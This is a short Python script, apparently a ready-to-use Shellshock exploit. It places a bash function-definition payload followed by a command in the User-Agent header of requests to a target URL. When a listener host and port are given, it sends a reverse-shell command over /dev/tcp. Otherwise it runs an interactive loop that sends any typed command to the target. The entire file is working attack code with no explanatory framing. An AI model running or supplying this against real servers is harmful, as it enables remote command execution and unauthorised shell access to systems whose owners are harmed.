from doctest import FAIL_FAST
import requests
import argparse
import sys

def sendCommand(command):
    global url
    user_agent = "() { :;}; "+command
    print(user_agent)
    requests.get(url,headers={'User-Agent':user_agent},verify=False)

parser = argparse.ArgumentParser(usage=f"python3 {sys.argv[0]} -u <url> -lh* <lhost> -lp* <lport>")

parser.add_argument("-u","--url")
parser.add_argument("-lh","--lhost")
parser.add_argument("-lp","--lport")

args = parser.parse_args()

if not args.url:
    print("[!] - Url is required")
    exit(0)

url=args.url
lhost=args.lhost if args.lhost else ''
lport= args.lport if args.lport else '4444'

if lhost and lport:
    print(f"[+] - Sending reverse shell to {lhost} {lport}")
    sendCommand(f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    exit(0)

while(1):
    cmd = input("$ ")
    sendCommand(cmd)
